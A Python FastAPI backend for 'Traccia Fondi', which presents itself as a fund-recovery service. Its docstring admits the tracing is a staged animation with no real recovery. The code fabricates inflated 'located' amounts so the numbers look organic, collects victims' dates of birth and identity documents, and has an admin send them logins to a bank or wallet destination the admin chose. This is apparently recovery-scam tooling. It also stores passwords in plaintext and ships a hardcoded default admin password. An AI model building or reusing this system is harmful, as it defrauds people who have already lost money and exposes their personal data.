"""
Traccia Fondi Backend (Admin-controlled accounts)
============================================

- Public user registration is DISABLED (returns helpful message).
- Admin (hardcoded credentials in .env) can: create, list, edit, delete users.
- User passwords are stored in PLAINTEXT (admin sees them), per requirements.
- Each user has: first_name, last_name, email, password, recovery_destination
  (chiantin_bank | zenthos_wallet), amount_lost_tier (set by user after login),
  located_amount (computed at "start procedure" time).
- Users login with the credentials given by admin.
- After login, user picks an amount tier and starts the 2-minute "recovery
  procedure" animation. At the end, the system reports their funds were
  "located" at the destination chosen by the admin.
- After the animation the user submits a Recovery Request (name, surname, email,
  message). The admin sees these and can compose an email manually (mailto)
  including credentials he types into the admin panel for that specific request.

NOTE: This is an UI-driven product. The "tracing" is staged animation. There is
NO real fund recovery happening.
"""

from fastapi import FastAPI, APIRouter, Depends, HTTPException, Header, UploadFile, File
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import random
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict, EmailStr
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone, timedelta
import jwt
import cloudinary
import cloudinary.uploader

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / ".env")

mongo_url = os.environ["MONGO_URL"]
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ.get("DB_NAME", "ai_funds")]

JWT_SECRET = os.environ.get("JWT_SECRET", "traccia-fondi-dev-secret-change-me")
JWT_ALG = "HS256"
JWT_EXP_HOURS = 24 * 7

ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "admin@traccia-fondi.com").lower()
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "AdminTF#2026!")

# --- Cloudinary ---
cloudinary.config(
    cloud_name=os.environ.get("CLOUDINARY_CLOUD_NAME", ""),
    api_key=os.environ.get("CLOUDINARY_API_KEY", ""),
    api_secret=os.environ.get("CLOUDINARY_API_SECRET", ""),
    secure=True,
)
MAX_DOCS_PER_USER = 5
MAX_FILE_BYTES = 25 * 1024 * 1024  # 25 MB
ALLOWED_MIME = {
    "image/jpeg", "image/jpg", "image/png", "image/webp", "image/heic", "image/heif",
    "application/pdf",
}

app = FastAPI(title="Traccia Fondi API", version="2.0.0")
api = APIRouter(prefix="/api")

# ============================================================
#   Helpers
# ============================================================

def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _new_id() -> str:
    return str(uuid.uuid4())


def _make_token(sub: str, role: str) -> str:
    payload = {
        "sub": sub,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(hours=JWT_EXP_HOURS),
        "iat": datetime.now(timezone.utc),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALG)


def _decode_token(token: str) -> dict:
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG])
    except jwt.ExpiredSignatureError:
        raise HTTPException(401, "Token expired")
    except Exception:
        raise HTTPException(401, "Invalid token")


def _bearer(authorization: Optional[str]) -> str:
    if not authorization or not authorization.lower().startswith("bearer "):
        raise HTTPException(401, "Missing bearer token")
    return authorization.split(" ", 1)[1].strip()


async def get_current_user(authorization: Optional[str] = Header(None)) -> Dict[str, Any]:
    payload = _decode_token(_bearer(authorization))
    if payload.get("role") != "user":
        raise HTTPException(403, "Forbidden")
    user = await db.users.find_one({"id": payload["sub"]}, {"_id": 0})
    if not user:
        raise HTTPException(401, "User not found")
    return user


async def require_admin(authorization: Optional[str] = Header(None)) -> Dict[str, Any]:
    payload = _decode_token(_bearer(authorization))
    if payload.get("role") != "admin":
        raise HTTPException(403, "Admin only")
    return payload


# Located amount per tier — well beyond the tier's high end so the user
# always sees a "bonus" amount discovered. Numbers are randomized inside
# the range so they look organic (e.g. 35,496 / 82,345 / 354,963).
TIER_HIGH_END = {
    "5000_20000":     (28000, 39999),
    "20000_50000":    (78000, 89999),
    "50000_100000":   (140000, 169999),
    "100000_plus":    (320000, 489999),
}


def _located_amount_for(tier: str) -> int:
    lo, hi = TIER_HIGH_END.get(tier, (18000, 19999))
    n = random.randint(lo, hi)
    # Add jitter on the units digit so it doesn't look round (e.g. 82345 not 82500)
    units = random.randint(0, 999)
    n = (n // 1000) * 1000 + units
    if n < lo: n = lo + units
    if n > hi: n = hi - random.randint(0, 500)
    return int(n)


# ============================================================
#   Schemas
# ============================================================

class HealthOut(BaseModel):
    status: str
    time: str


# --- Auth ---
class LoginIn(BaseModel):
    email: EmailStr
    password: str


class AuthOut(BaseModel):
    token: str
    user: Dict[str, Any]


# --- Admin user mgmt ---
class AdminUserIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    first_name: str
    last_name: str
    email: EmailStr
    password: str = Field(min_length=4, max_length=128)
    recovery_destination: str  # "chiantin_bank" | "zenthos_wallet"
    notes: Optional[str] = None


class AdminUserUpdate(BaseModel):
    model_config = ConfigDict(extra="ignore")
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    email: Optional[EmailStr] = None
    password: Optional[str] = None
    recovery_destination: Optional[str] = None
    notes: Optional[str] = None


# --- User actions ---
class StartProcedureIn(BaseModel):
    amount_tier: str  # 5000_20000 / 20000_50000 / 50000_100000 / 100000_plus
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    contact_email: Optional[EmailStr] = None
    date_of_birth: Optional[str] = None  # ISO date string YYYY-MM-DD


class RecoveryRequestIn(BaseModel):
    first_name: str
    last_name: str
    email: EmailStr
    message: Optional[str] = None


class RecoveryEmailUpdate(BaseModel):
    """Admin fills these to compose the email."""
    destination_login_email: Optional[str] = None
    destination_login_password: Optional[str] = None
    destination_login_url: Optional[str] = None
    extra_notes: Optional[str] = None


# ============================================================
#   Routes — health + auth
# ============================================================

@api.get("/health", response_model=HealthOut)
async def health():
    return HealthOut(status="ok", time=_now_iso())


@api.post("/auth/login", response_model=AuthOut)
async def login(body: LoginIn):
    """
    Single login endpoint for both admin and regular users.
    - Admin: matches ADMIN_EMAIL/ADMIN_PASSWORD from .env.
    - Users: created by admin with plaintext passwords.
    """
    em = body.email.lower().strip()

    if em == ADMIN_EMAIL and body.password == ADMIN_PASSWORD:
        return AuthOut(
            token=_make_token("admin", "admin"),
            user={"id": "admin", "email": ADMIN_EMAIL, "role": "admin", "first_name": "Admin", "last_name": ""},
        )

    user = await db.users.find_one({"email": em}, {"_id": 0})
    if not user or user.get("password") != body.password:
        raise HTTPException(401, "Invalid credentials")

    safe = {k: v for k, v in user.items() if k != "password"}
    safe["role"] = "user"
    return AuthOut(token=_make_token(user["id"], "user"), user=safe)


@api.post("/auth/register")
async def register_disabled():
    """Public registration is disabled in this product."""
    raise HTTPException(
        status_code=403,
        detail="Registration is currently unavailable. Please contact your administrator.",
    )


@api.get("/auth/me")
async def me(authorization: Optional[str] = Header(None)):
    payload = _decode_token(_bearer(authorization))
    if payload.get("role") == "admin":
        return {"id": "admin", "email": ADMIN_EMAIL, "role": "admin", "first_name": "Admin", "last_name": ""}
    user = await db.users.find_one({"id": payload["sub"]}, {"_id": 0, "password": 0})
    if not user:
        raise HTTPException(401, "User not found")
    user["role"] = "user"
    return user


# ============================================================
#   Admin user management (PLAINTEXT passwords visible)
# ============================================================

@api.get("/admin/users")
async def admin_list_users(_=Depends(require_admin)):
    users = await db.users.find({}, {"_id": 0}).sort("created_at", -1).to_list(2000)
    return users


@api.post("/admin/users")
async def admin_create_user(body: AdminUserIn, _=Depends(require_admin)):
    em = body.email.lower().strip()
    if await db.users.find_one({"email": em}):
        raise HTTPException(400, "Email already exists")
    if body.recovery_destination not in {"chiantin_bank", "zenthos_wallet"}:
        raise HTTPException(400, "Invalid recovery_destination")
    doc = {
        "id": _new_id(),
        "first_name": body.first_name.strip(),
        "last_name": body.last_name.strip(),
        "email": em,
        "password": body.password,  # PLAINTEXT — by admin requirement
        "recovery_destination": body.recovery_destination,
        "notes": body.notes or "",
        "amount_tier": None,
        "located_amount": 0,
        "procedure_started_at": None,
        "procedure_completed_at": None,
        "created_at": _now_iso(),
    }
    await db.users.insert_one(doc)
    doc.pop("_id", None)
    return doc


@api.put("/admin/users/{user_id}")
async def admin_update_user(user_id: str, body: AdminUserUpdate, _=Depends(require_admin)):
    update = {k: v for k, v in body.model_dump().items() if v is not None}
    if "email" in update:
        update["email"] = update["email"].lower().strip()
    if "recovery_destination" in update and update["recovery_destination"] not in {"chiantin_bank", "zenthos_wallet"}:
        raise HTTPException(400, "Invalid recovery_destination")
    res = await db.users.update_one({"id": user_id}, {"$set": update})
    if res.matched_count == 0:
        raise HTTPException(404, "User not found")
    return await db.users.find_one({"id": user_id}, {"_id": 0})


@api.delete("/admin/users/{user_id}")
async def admin_delete_user(user_id: str, _=Depends(require_admin)):
    await db.users.delete_one({"id": user_id})
    return {"ok": True}


# ============================================================
#   User flow — start procedure & dashboard state
# ============================================================

@api.post("/procedure/start")
async def start_procedure(body: StartProcedureIn, user=Depends(get_current_user)):
    if body.amount_tier not in TIER_HIGH_END:
        raise HTTPException(400, "Invalid amount_tier")
    located = _located_amount_for(body.amount_tier)
    update = {
        "amount_tier": body.amount_tier,
        "located_amount": located,
        "procedure_started_at": _now_iso(),
        "procedure_completed_at": None,
    }
    # Save the user-provided name/surname/email so the recovery-request form
    # can prefill them when the procedure completes.
    if body.first_name:    update["procedure_first_name"]   = body.first_name.strip()
    if body.last_name:     update["procedure_last_name"]    = body.last_name.strip()
    if body.contact_email: update["procedure_contact_email"] = body.contact_email.lower().strip()
    if body.date_of_birth: update["procedure_date_of_birth"] = body.date_of_birth.strip()
    await db.users.update_one({"id": user["id"]}, {"$set": update})
    return {**update, "recovery_destination": user.get("recovery_destination")}


@api.post("/procedure/complete")
async def complete_procedure(user=Depends(get_current_user)):
    update = {"procedure_completed_at": _now_iso()}
    await db.users.update_one({"id": user["id"]}, {"$set": update})
    return update


@api.get("/procedure/state")
async def procedure_state(user=Depends(get_current_user)):
    return {
        "amount_tier": user.get("amount_tier"),
        "located_amount": user.get("located_amount", 0),
        "recovery_destination": user.get("recovery_destination"),
        "procedure_started_at": user.get("procedure_started_at"),
        "procedure_completed_at": user.get("procedure_completed_at"),
        "procedure_first_name": user.get("procedure_first_name", ""),
        "procedure_last_name": user.get("procedure_last_name", ""),
        "procedure_contact_email": user.get("procedure_contact_email", ""),
        "procedure_date_of_birth": user.get("procedure_date_of_birth", ""),
    }


# ============================================================
#   Recovery requests
# ============================================================

@api.post("/recovery-requests")
async def create_recovery_request(body: RecoveryRequestIn, user=Depends(get_current_user)):
    doc = {
        "id": _new_id(),
        "user_id": user["id"],
        "user_email": user.get("email"),
        "first_name": body.first_name.strip(),
        "last_name": body.last_name.strip(),
        "email": body.email.lower().strip(),
        "message": (body.message or "").strip(),
        "located_amount": user.get("located_amount", 0),
        "recovery_destination": user.get("recovery_destination"),
        "status": "pending",  # pending | sent | done
        # Admin-filled credentials (empty until admin types them)
        "destination_login_email": "",
        "destination_login_password": "",
        "destination_login_url": "",
        "extra_notes": "",
        "created_at": _now_iso(),
        "sent_at": None,
    }
    await db.recovery_requests.insert_one(doc)
    doc.pop("_id", None)
    return doc


@api.get("/admin/recovery-requests")
async def admin_list_requests(_=Depends(require_admin)):
    docs = await db.recovery_requests.find({}, {"_id": 0}).sort("created_at", -1).to_list(2000)
    return docs


@api.put("/admin/recovery-requests/{req_id}")
async def admin_update_request(req_id: str, body: RecoveryEmailUpdate, _=Depends(require_admin)):
    update = {k: v for k, v in body.model_dump().items() if v is not None}
    res = await db.recovery_requests.update_one({"id": req_id}, {"$set": update})
    if res.matched_count == 0:
        raise HTTPException(404, "Request not found")
    return await db.recovery_requests.find_one({"id": req_id}, {"_id": 0})


@api.post("/admin/recovery-requests/{req_id}/mark-sent")
async def admin_mark_sent(req_id: str, _=Depends(require_admin)):
    await db.recovery_requests.update_one(
        {"id": req_id},
        {"$set": {"status": "sent", "sent_at": _now_iso()}},
    )
    return await db.recovery_requests.find_one({"id": req_id}, {"_id": 0})


@api.delete("/admin/recovery-requests/{req_id}")
async def admin_delete_request(req_id: str, _=Depends(require_admin)):
    await db.recovery_requests.delete_one({"id": req_id})
    return {"ok": True}


# ============================================================
#   Documents — Cloudinary signed uploads (per user)
# ============================================================

@api.get("/documents")
async def list_documents(user=Depends(get_current_user)):
    """List all documents uploaded by the current user."""
    docs = await db.documents.find(
        {"user_id": user["id"]}, {"_id": 0}
    ).sort("created_at", -1).to_list(50)
    return docs


@api.post("/documents/upload")
async def upload_document(file: UploadFile = File(...), user=Depends(get_current_user)):
    """
    Upload a single document for the current user. The file is sent to
    Cloudinary using server-side signed upload (the user never sees Cloudinary
    credentials and we control the folder/limits).
    """
    # Per-user document cap
    count = await db.documents.count_documents({"user_id": user["id"]})
    if count >= MAX_DOCS_PER_USER:
        raise HTTPException(400, f"Maximum {MAX_DOCS_PER_USER} documents per user")

    # MIME check
    if file.content_type not in ALLOWED_MIME:
        raise HTTPException(400, f"File type not allowed: {file.content_type}")

    # Size check (read into memory — fine for our 25 MB cap)
    contents = await file.read()
    if len(contents) > MAX_FILE_BYTES:
        raise HTTPException(400, f"File too large (max {MAX_FILE_BYTES // (1024*1024)} MB)")

    # Upload to Cloudinary
    folder = f"traccia-fondi/users/{user['id']}"
    is_pdf = file.content_type == "application/pdf"
    try:
        # 'auto' resource_type lets Cloudinary handle PDFs as 'image' for thumbnails too,
        # but we use 'raw' for PDFs to keep them as-is and 'image' for images.
        resource_type = "raw" if is_pdf else "image"
        result = cloudinary.uploader.upload(
            contents,
            folder=folder,
            resource_type=resource_type,
            use_filename=True,
            unique_filename=True,
            overwrite=False,
            tags=["traccia-fondi", "user-doc", user["id"]],
        )
    except Exception as e:
        logger.exception("Cloudinary upload failed")
        raise HTTPException(500, f"Upload failed: {e}")

    doc = {
        "id": _new_id(),
        "user_id": user["id"],
        "original_name": file.filename or "document",
        "mime_type": file.content_type,
        "size_bytes": len(contents),
        "cloudinary_public_id": result.get("public_id"),
        "cloudinary_resource_type": resource_type,
        "url": result.get("secure_url"),
        "thumbnail_url": (result.get("secure_url") if not is_pdf else None),
        "created_at": _now_iso(),
    }
    await db.documents.insert_one(doc)
    doc.pop("_id", None)
    return doc


@api.delete("/documents/{doc_id}")
async def delete_document(doc_id: str, user=Depends(get_current_user)):
    """Delete a document the user owns (also removes it from Cloudinary)."""
    d = await db.documents.find_one({"id": doc_id, "user_id": user["id"]}, {"_id": 0})
    if not d:
        raise HTTPException(404, "Document not found")
    try:
        cloudinary.uploader.destroy(
            d["cloudinary_public_id"],
            resource_type=d.get("cloudinary_resource_type", "image"),
            invalidate=True,
        )
    except Exception:
        logger.warning("Cloudinary destroy failed for %s", d["cloudinary_public_id"])
    await db.documents.delete_one({"id": doc_id})
    return {"ok": True}


@api.get("/admin/users/{user_id}/documents")
async def admin_list_user_documents(user_id: str, _=Depends(require_admin)):
    """Admin: list all documents for a specific user."""
    docs = await db.documents.find(
        {"user_id": user_id}, {"_id": 0}
    ).sort("created_at", -1).to_list(50)
    return docs


# ============================================================
#   Mount + middleware
# ============================================================

app.include_router(api)
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get("CORS_ORIGINS", "*").split(","),
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("traccia-fondi")


@app.on_event("shutdown")
async def shutdown():
    client.close()
